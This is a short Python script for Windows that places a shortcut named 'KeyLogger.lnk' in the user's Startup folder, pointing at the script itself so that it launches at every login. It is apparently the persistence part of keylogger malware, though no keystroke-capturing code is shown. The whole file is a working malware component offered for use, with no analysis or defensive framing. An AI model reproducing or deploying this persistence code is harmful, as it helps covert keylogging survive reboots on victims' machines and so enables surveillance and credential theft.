import sys, os, winshell, win32com.client

srcFile = os.path.abspath(os.path.realpath(__file__))
dstFolder = winshell.startup()
dstShortcut = os.path.join(dstFolder, 'KeyLogger.lnk')
shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(dstShortcut)
shortcut.Targetpath = srcFile
shortcut.save()